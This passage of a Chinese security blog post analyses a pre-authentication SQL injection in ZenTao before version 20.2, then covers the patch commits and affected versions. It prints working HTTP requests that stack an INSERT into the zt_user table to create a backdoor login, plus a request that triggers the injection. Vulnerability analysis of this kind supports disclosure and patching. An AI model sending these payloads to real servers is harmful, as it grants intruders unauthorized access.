class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadModel(<span class="string">&#x27;setting&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) <span class="keyword">$this</span>-&gt;setting-&gt;setItem(<span class="string">&quot;<span class="subst">&#123;$this-&gt;app-&gt;user-&gt;account&#125;</span>.common.<span class="subst">$key</span>&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setting-&gt;setItem(<span class="string">&quot;<span class="subst">&#123;$this-&gt;app-&gt;user-&gt;account&#125;</span>.common.preferenceSetted&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;saveSuccess, <span class="string">&#x27;closeModal&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;callback&#x27;</span> =&gt; <span class="string">&#x27;$.apps.updateAppsMenu&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;title      = <span class="keyword">$this</span>-&gt;lang-&gt;my-&gt;common . <span class="keyword">$this</span>-&gt;lang-&gt;hyphen . <span class="keyword">$this</span>-&gt;lang-&gt;my-&gt;preference;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;showTip    = <span class="variable">$showTip</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;URSRList         = <span class="keyword">$this</span>-&gt;loadModel(<span class="string">&#x27;custom&#x27;</span>)-&gt;getURSRPairs();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;URSR             = <span class="keyword">$this</span>-&gt;setting-&gt;getURSR();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;programLink      = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;config-&gt;programLink)   ? <span class="keyword">$this</span>-&gt;config-&gt;programLink   : <span class="string">&#x27;program-browse&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;productLink      = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;config-&gt;productLink)   ? <span class="keyword">$this</span>-&gt;config-&gt;productLink   : <span class="string">&#x27;product-all&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;projectLink      = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;config-&gt;projectLink)   ? <span class="keyword">$this</span>-&gt;config-&gt;projectLink   : <span class="string">&#x27;project-browse&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;executionLink    = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;config-&gt;executionLink) ? <span class="keyword">$this</span>-&gt;config-&gt;executionLink : <span class="string">&#x27;execution-task&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;preferenceSetted = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;config-&gt;preferenceSetted) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;display();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此很容易得出”错误的”第一步</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/zentao/my-preference</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/zentao/index.php</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"></span><br><span class="line"><span class="awk">edition=y4hacker&amp;vision=<span class="number">1</span><span class="string">&#x27;;insert into zt_user(type,account,password,realname,pinyin) value(&#x27;</span>inside<span class="string">&#x27;,&#x27;</span>y4hacke<span class="string">r&#x27;,&#x27;</span>c4d038b4bed09fdb1471ef51ec3a32cd<span class="string">&#x27;,&#x27;</span>y4hacke<span class="string">r&#x27;,&#x27;</span>y4hacke<span class="string">r&#x27;);%23</span></span></span><br></pre></td></tr></table></figure><p>密码是md5或者sha1存储的生成的时候自己搞一个替换即可</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001334993.png" alt="image-20240827001334993"></p><p>此时我们成功修改了数据库配置</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240826234855004.png" alt="image-20240826234855004"></p><p>但是也成功把环境搞炸了</p><h3 id="踩坑1-环境炸了"><a href="#踩坑1-环境炸了" class="headerlink" title="踩坑1-环境炸了"></a>踩坑1-环境炸了</h3><p>看到此时正常访问也报错了..，不难看出来是文件不存在</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240826234948204.png" alt="image-20240826234948204"></p><p>当然经过排查最终发现在index.php-&gt;setParams-&gt;getDefaultParams报错</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000059791.png" alt="image-20240827000059791"></p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000126205.png" alt="image-20240827000126205"></p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000152432.png" alt="image-20240827000152432"></p><p>知道原因后解决方法便很简单了，通过使用默认存在的目录即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/zentao/my-preference</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/zentao/index.php</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"></span><br><span class="line"><span class="awk">edition=y4hacker&amp;vision=<span class="number">1</span><span class="string">&#x27;;insert into zt_user(type,account,password,realname,pinyin) value(&#x27;</span>inside<span class="string">&#x27;,&#x27;</span>y4hacke<span class="string">r&#x27;,&#x27;</span>c4d038b4bed09fdb1471ef51ec3a32cd<span class="string">&#x27;,&#x27;</span>y4hacke<span class="string">r&#x27;,&#x27;</span>y4hacke<span class="string">r&#x27;);%23/../../open/rnd</span></span></span><br></pre></td></tr></table></figure><p>也成功修改了数据库</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000633373.png" alt="image-20240827000633373"></p><p>同时这下环境恢复正常了2333</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000657535.png" alt="image-20240827000657535"></p><h3 id="踩坑2-如何触发SQL执行"><a href="#踩坑2-如何触发SQL执行" class="headerlink" title="踩坑2-如何触发SQL执行"></a>踩坑2-如何触发SQL执行</h3><p>刚刚我们其实只是简单梳理了过程，对执行的细节还没有细说,当然也并不难，那就是在<code>\router::setControlFile</code>中，如果请求的module并没有在workflow中定义那就会提前返回</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001018434.png" alt="image-20240827001018434"></p><p>简单看看数据库即可知道存在哪些module</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001108415.png" alt="image-20240827001108415"></p><p>触发注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/zentao/product-y4hacker</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/zentao/index.php</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问后成功触发，数据库也更新成功</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001237320.png" alt="image-20240827001237320"></p><p>尝试前台登录，成功！</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001420998.png" alt="image-20240827001420998"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a target="_blank" rel="noopener" href="https://github.com/easysoft/zentaopms/commit/a07f9909270541c207c2ea22c09e257a511c51f0">https://github.com/easysoft/zentaopms/commit/a07f9909270541c207c2ea22c09e257a511c51f0</a></p><p>可以看到在其中移除了一些openMethods</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214056652.png" alt="image-20240827214056652"></p><p>这个openMethods在哪里校验的相信大家也会好奇，这里我给一个执行路径</p><p>第一次校验是在控制器初始化过程</p><p><code>index.php=&gt;$app-&gt;setParams()</code>-&gt;<code>router.class.php=&gt;$this-&gt;getDefaultParams()</code></p><p>在这里会实例化我们的控制器</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214648827.png" alt="image-20240827214648827"></p><p>以我们这次利用过程中的类<code>my</code>为例</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214801468.png" alt="image-20240827214801468"></p><p>首先调用父类的构造函数</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214829916.png" alt="image-20240827214829916"></p><p>在父类的构造函数中，又先调用了父类的父类的构造函数</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214901452.png" alt="image-20240827214901452"></p><p>在这里我们主要关注if的条件是否<code>moduleName</code>在<code>openModules</code>里，以及<code>moduleName</code>、<code>methodName</code>又是否在<code>OpenMethod</code>里，很显然在最新版以前<code>my.preference</code>在<code>OpenMethod</code>中，这点从diff也不难看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config-&gt;installed &amp;&amp; !in_array(<span class="keyword">$this</span>-&gt;moduleName, <span class="keyword">$this</span>-&gt;config-&gt;openModules) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;app-&gt;user) &amp;&amp; !<span class="keyword">$this</span>-&gt;loadModel(<span class="string">&#x27;common&#x27;</span>)-&gt;isOpenMethod(<span class="keyword">$this</span>-&gt;moduleName, <span class="keyword">$this</span>-&gt;methodName))</span><br></pre></td></tr></table></figure><p>后面又第二次做了commit彻底终结了这个漏洞</p><p><a target="_blank" rel="noopener" href="https://github.com/easysoft/zentaopms/commit/60bd0dd9caedf5798fbc98af65117d516d13391c">https://github.com/easysoft/zentaopms/commit/60bd0dd9caedf5798fbc98af65117d516d13391c</a></p><p>key被设置成了白名单，也意味着这个漏洞的终结</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827215258268.png" alt="image-20240827215258268"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>记录一下影响版本禅道项目管理软件开源版:18.0.beta1 &lt;= version &lt;= 18.13.stable,20.0.beta1 &lt;= version &lt; 20.2,17.0.beta1 &lt;= version &lt;= 17.8,16.5受影响。</p></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">1.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%911-%E7%8E%AF%E5%A2%83%E7%82%B8%E4%BA%86"><span class="toc-number">1.2.</span> <span class="toc-text">踩坑1-环境炸了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%912-%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91SQL%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.</span> <span class="toc-text">踩坑2-如何触发SQL执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">3.</span> <span class="toc-text">其他</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&text=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&is_video=false&description=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=浅析禅道前台SQL注入(Version&lt;20.2)&body=Check out this article: https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&name=浅析禅道前台SQL注入(Version&lt;20.2)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&t=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2025 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>